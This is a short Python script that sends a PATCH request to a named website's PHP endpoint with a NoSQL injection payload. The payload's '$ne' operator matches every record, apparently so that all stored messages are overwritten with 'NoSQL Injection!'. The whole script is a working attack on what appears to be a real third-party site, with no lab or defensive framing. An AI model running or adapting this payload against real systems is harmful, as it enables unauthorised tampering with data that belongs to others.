import requests

r = requests.patch(
    'http://lolinactive.com/LoLInactive.php',
    data={"id": {"$ne": -1}, "message": "NoSQL Injection!"},
    headers={'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'},
)
print(r.text)
print(r)
